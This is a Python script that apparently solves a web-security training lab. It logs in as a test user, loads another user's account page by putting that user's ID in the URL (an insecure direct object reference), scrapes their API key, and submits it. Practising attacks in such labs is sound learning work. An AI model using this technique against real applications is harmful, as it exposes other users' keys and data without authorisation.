import requests
from bs4 import BeautifulSoup
import re

site = "0a1400f2038fc43286973fc200e600e5.web-security-academy.net"
s = requests.Session()

# Step 1: Login as wiener
login_url = f"https://{site}/login"
s.post(login_url, data={"username": "wiener", "password": "peter"})

# Step 2: Manually insert Carlos's randomized user ID found from browser
carlos_userid = "ca851d8e-e800-47c5-b434-76114b9e71b1"

# Step 3: Access Carlos’s profile
profile_url = f"https://{site}/my-account?id={carlos_userid}"
resp = s.get(profile_url)
soup = BeautifulSoup(resp.text, 'html.parser')

div_text = soup.find('div', string=re.compile('API'))
if not div_text:
    print("[!] Could not find API key div.")
    exit(1)

api_key = div_text.text.split(' ')[4]
print(f"[✓] Retrieved Carlos's API key: {api_key}")

# Step 4: Submit the key
submit_url = f"https://{site}/submitSolution"
s.post(submit_url, data={'answer': api_key})

# Step 5: Confirm solve status
resp = s.get(f"https://{site}/")
soup = BeautifulSoup(resp.text, 'html.parser')
if soup.find('div', class_='widgetcontainer-lab-status is-solved'):
    print("[✓] Lab solved and API key submitted successfully.")
else:
    print("[!] Submission sent, but lab not confirmed as solved.")
